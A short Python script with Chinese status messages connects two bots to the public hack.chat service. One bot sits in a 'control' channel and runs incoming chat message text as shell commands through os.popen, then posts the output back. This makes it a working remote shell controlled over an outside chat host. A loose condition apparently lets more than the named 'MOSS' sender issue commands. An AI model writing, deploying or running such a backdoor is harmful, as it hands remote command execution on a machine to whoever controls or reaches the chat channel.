import robotmodel as r
import random
import os,time
x=r.hackchat()
print('正在启动中，第一步')
time.sleep(10)
y=r.hackchat()
x.connect('wss://hack.chat/chat-ws')
print('正在启动中，第二步')
time.sleep(10)
y.connect('wss://hack.chat/chat-ws')
print('正在启动中，第三步')
time.sleep(10)
x.join('control','hack'+str(random.randint(100,999)),'none')
print('正在启动中，第四步')
time.sleep(10)
y.join('lounge','rickroll'+str(random.randint(100,999)),'none')
print('启动完成，请开始你的表演')
while True:
	msg=x.recv()
	if(msg[0] == 0 or msg[1] == 'MOSS'):
		wa=os.popen(msg[2])
		time.sleep(3)
		x.send(str(wa.read().split('\n')))